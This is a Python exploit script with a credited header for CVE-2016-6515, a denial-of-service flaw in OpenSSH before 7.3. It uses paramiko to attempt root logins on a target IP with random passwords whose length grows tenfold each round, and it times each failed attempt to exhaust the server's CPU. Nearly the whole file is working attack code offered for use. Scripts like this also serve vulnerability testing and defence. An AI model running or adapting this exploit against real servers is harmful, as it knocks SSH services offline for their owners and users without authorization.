################################################################################
# Title		: OpenSSH before 7.3 Crypt CPU Consumption (DoS Vulnerability)
# Author	: Kashinath T (tkashinath@secpod.com) (www.secpod.com)
# Vendor	: http://www.openssh.com/
# Software	: http://www.openssh.com/
# Version	: OpenSSH before 7.3
# Tested on	: Ubuntu 16.04 LTS, Centos 7
# CVE 		: CVE-2016-6515
# Date		: 20-10-2016
#
# NOTE:
# If the remote machine is installed and running OpenSSH version prior to 7.3,
# it does not limit the password length for authentication. Hence, to exploit
# this vulnerability' we will send a crafted data which is of 90000 characters
# in length to the 'password' field while attempting to log in to a remote
# machine via ssh with username as 'root'.
#
# For more info refer,
# http://www.secpod.com/blog/openssh-crypt-cpu-consumption
################################################################################

import sys
from random import choice
import string
import time
try:
    import paramiko
except ImportError:
    print ("[-] python module 'paramiko' is missing, Install paramiko with" \
          " following command 'sudo pip install paramiko'")
    sys.exit(0)


class ssh_exploit:

    def __init__(self):
        """
        Initialise the objects
        """

    def ssh_login(self, remote_ip):

        try:
            # Crafted password of length 90000
            #passwd_len = 90000
            #crafted_passwd = "".join(choice(lowercase) for i in range(passwd_len))

            # Connect to a remote machine via ssh
            ssh = paramiko.SSHClient()
            ssh.load_system_host_keys()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # calling connect in infinite loop
            print("[+] Entering test loop")
            base_len=9
            for i in range(10):
                passwd_len = base_len*(10**i)
                input(passwd_len)
                crafted_passwd = "".join(choice(string.ascii_lowercase) for i in range(passwd_len))
                start_time=time.time()
                try:
                    ssh.connect(remote_ip, username='root',
                            password=crafted_passwd)
                except Exception as msg:
                    if str(msg)=='Authentication failed.':
                        end_time=time.time()
                        print('time=',int((end_time-start_time)*1000),'ms')
                    else:raise Exception(msg)
        except Exception as msg:
            print ("Error in connecting to remote host : ", remote_ip)
            print ("Exception in : ssh_login method.")
            sys.exit(msg)


def main():

    if len(sys.argv) != 2:
        print ("usage: python openssh_crypt_cpu_consumption_dos.py 192.168.x.x")
        sys.exit()
    ip=sys.argv[1]
    # Calling ssh_connect
    ref_obj = ssh_exploit()
    ref_obj.ssh_login(ip)


if __name__ == "__main__":
    main()